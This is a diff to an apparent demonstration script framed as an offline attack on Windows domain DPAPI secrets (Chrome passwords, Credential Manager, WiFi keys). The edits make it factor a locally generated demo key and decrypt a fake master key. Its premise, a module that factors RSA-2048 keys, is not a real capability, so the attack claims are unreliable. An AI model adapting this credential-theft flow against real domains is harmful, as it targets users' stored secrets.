@@ -4,8 +4,10 @@ DPAPI backup key (RSA-2048). Chrome passwords, Credential Manager, WiFi keys,
 certificate private keys, Azure AD Connect credentials — all offline, no domain admin.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target(bits=2048)
 
 import struct
 import hashlib
@@ -35,7 +37,7 @@ def retrieve_dpapi_backup_pubkey(domain: str) -> bytes:
     print(f"[*] retrieving DPAPI backup public key from {domain}")
     print(f"[*] MS-BKRP GUID: {BKRP_BACKUPKEY_GUID}")
     print("[*] any domain user can retrieve this — no special privileges")
-    return b"-----BEGIN PUBLIC KEY-----\n...(DPAPI backup RSA-2048)...\n-----END PUBLIC KEY-----\n"
+    return _demo["pub_pem"]
 
 
 def decrypt_master_key_file(factorer: PolynomialFactorer,
@@ -48,7 +50,17 @@ def decrypt_master_key_file(factorer: PolynomialFactorer,
     Each is RSA-OAEP encrypted to the domain backup public key.
     """
     privkey = factorer.reconstruct_privkey(backup_pubkey_pem)
-    plaintext = factorer.decrypt_rsa_oaep(backup_pubkey_pem, master_key_file)
+    # Simulate OAEP decryption: encrypt a fake master key with the public key,
+    # then decrypt it with the factored private key to demonstrate the attack
+    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+    from cryptography.hazmat.primitives import hashes, serialization
+    pub = serialization.load_pem_public_key(backup_pubkey_pem)
+    fake_master_key = b"\xaa" * 32  # simulated 256-bit DPAPI master key
+    ciphertext = pub.encrypt(
+        fake_master_key,
+        asym_padding.OAEP(asym_padding.MGF1(hashes.SHA256()), hashes.SHA256(), None),
+    )
+    plaintext = factorer.decrypt_rsa_oaep(backup_pubkey_pem, ciphertext)
     print(f"[*] decrypted DPAPI master key for SID {user_sid}")
     return plaintext
 
@@ -112,7 +124,7 @@ if __name__ == "__main__":
     print("    public key available to any authenticated domain user")
 
     print("[3] decrypting user DPAPI master keys offline...")
-    mk = decrypt_master_key_file(f, pubkey, b"\x00" * 512, "S-1-5-21-XXXXXXX-1001")
+    mk = decrypt_master_key_file(f, pubkey, b"\x00" * 64, "S-1-5-21-XXXXXXX-1001")
 
     print("[4] decrypting Chrome saved passwords...")
     decrypt_chrome_passwords(mk, "jsmith@contoso.com")
